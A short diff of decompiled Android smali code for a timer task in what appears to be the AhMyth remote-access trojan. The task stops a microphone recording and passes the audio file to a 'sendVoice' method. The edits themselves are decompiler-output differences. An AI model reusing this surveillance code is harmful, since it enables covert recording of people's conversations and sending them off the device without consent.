@@ -1,4 +1,4 @@
-.class final Lahmyth/mine/king/ahmyth/MicManager$1;
+.class Lahmyth/mine/king/ahmyth/MicManager$1;
 .super Ljava/util/TimerTask;
 .source "MicManager.java"
 
@@ -9,7 +9,7 @@
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
-    accessFlags = 0x8
+    accessFlags = 0x0
     name = null
 .end annotation
 
@@ -18,7 +18,6 @@
 .method constructor <init>()V
     .locals 0
 
-    .prologue
     .line 64
     invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V
 
@@ -30,7 +29,6 @@
 .method public run()V
     .locals 1
 
-    .prologue
     .line 68
     sget-object v0, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;
 
@@ -44,7 +42,6 @@
     .line 70
     sget-object v0, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;
 
-    # invokes: Lahmyth/mine/king/ahmyth/MicManager;->sendVoice(Ljava/io/File;)V
     invoke-static {v0}, Lahmyth/mine/king/ahmyth/MicManager;->access$000(Ljava/io/File;)V
 
     .line 71
